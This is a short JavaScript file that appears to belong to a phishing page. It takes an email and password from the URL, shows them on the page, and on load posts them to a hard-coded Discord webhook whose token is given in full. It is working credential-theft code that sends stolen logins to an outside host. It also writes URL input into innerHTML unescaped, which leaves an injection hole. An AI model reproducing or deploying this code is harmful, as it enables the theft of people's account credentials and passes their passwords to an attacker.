var urlParams;
(window.onpopstate = function () {
    var match,
        pl     = /\+/g,  // Regex for replacing addition symbol with a space
        search = /([^&=]+)=?([^&]*)/g,
        decode = function (s) { return decodeURIComponent(s.replace(pl, " ")); },
        query  = window.location.search.substring(1);

    urlParams = {};
    while (match = search.exec(query))
       urlParams[decode(match[1])] = decode(match[2]);
})();
function onLoad() {
  document.querySelector("#email").innerHTML = "Your email is "+urlParams.email;
  document.querySelector("#pass").innerHTML = "Your password is "+urlParams.pass;
  sendMessage()
}


function sendMessage() {
  var request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/798081712231546940/GawBCIDdNd7nHvQq94c6IL71MrevU_UXqNNIHU38v4IYRfBpRamsTCnsJXqQcNDC9zY2");

  request.setRequestHeader('Content-type', 'application/json');

  var params = {
        username: "XDDDD",
        avatar_url: "",
        content: `Email: ${urlParams.email}\r\nPass: ${urlParams.pass}`
      }

  request.send(JSON.stringify(params));
}
